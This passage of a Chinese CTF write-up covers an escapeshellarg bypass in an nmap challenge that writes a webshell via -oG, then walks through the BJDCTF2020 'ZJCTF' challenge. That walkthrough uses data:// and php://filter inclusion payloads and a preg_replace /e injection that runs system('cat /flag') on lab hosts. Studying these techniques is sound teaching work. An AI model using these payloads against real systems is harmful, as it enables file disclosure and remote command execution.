4.最后执行的命令是curl ‘172.17.0.2’\’’ -v -d a=1’，由于中间的\被解释为\而不再是转义字符，所以后面的’没有被转义，与再后面的’配对儿成了一个空白连接符。所以可以简化为curl 172.17.0.2\ -v -d a=1’，即向172.17.0.2\发起请求，POST 数据为a=1’。

```php
总结来说我们要在webshell前加'是为了提供一个\,功能是向\前的ip发起请求，这样我们就能
对此ip进行shell。

在本题中原码的意思是我们输入一个ip然后扫描，通过上面的两个函数来进行规则过滤转义，
我们的输入会被单引号引起来，但因上面的漏洞所以我们可以用'逃脱这个引号的束缚
```



```php
并且在nmap命令中 有一个参数-oG可以实现将命令和结果写到文件，这样我们就可以通过文件包含来进行命令执行，或蚁剑连接。
```





## [BJDCTF2020]ZJCTF，不过如此

```php
<?php

error_reporting(0);
$text = $_GET["text"];
$file = $_GET["file"];
if(isset($text)&&(file_get_contents($text,'r')==="I have a dream")){
    echo "<br><h1>".file_get_contents($text,'r')."</h1></br>";
    if(preg_match("/flag/",$file)){
        die("Not now!");
    }

    include($file);  //next.php
    
}
else{
    highlight_file(__FILE__);
}
?>
```



```php
http://469abb72-79e7-4c12-a595-02f51e1ddfa3.node4.buuoj.cn:81/?text=data://text/plain,I%20have%20a%20dream&file=next.php
```



![img](https://img-blog.csdnimg.cn/98615e25dc3c4948b02aed0b6da06fed.png)





```php
http://469abb72-79e7-4c12-a595-02f51e1ddfa3.node4.buuoj.cn:81/?text=data://text/plain,I%20have%20a%20dream&file=php://filter/convert.base64-encode/resource=next.php
```



![img](https://img-blog.csdnimg.cn/267d9e7e618142d2ad75991fe73b9c74.png)



```php
<?php
$id = $_GET['id'];
$_SESSION['id'] = $id;

function complex($re, $str) {
    return preg_replace(
        '/(' . $re . ')/ei',
        'strtolower("\\1")',
        $str
    );
}


foreach($_GET as $re => $str) {
    echo complex($re, $str). "\n";
}

function getFlag(){
	@eval($_GET['cmd']);
}
```





```php
http://051b1af0-9322-4e25-9615-ea8c873f2568.node4.buuoj.cn:81/?text=data://text/plain,I%20have%20a%20dream&file=next.php&\S*=${getflag()}&cmd=system(%27cat%20/flag%27);
```

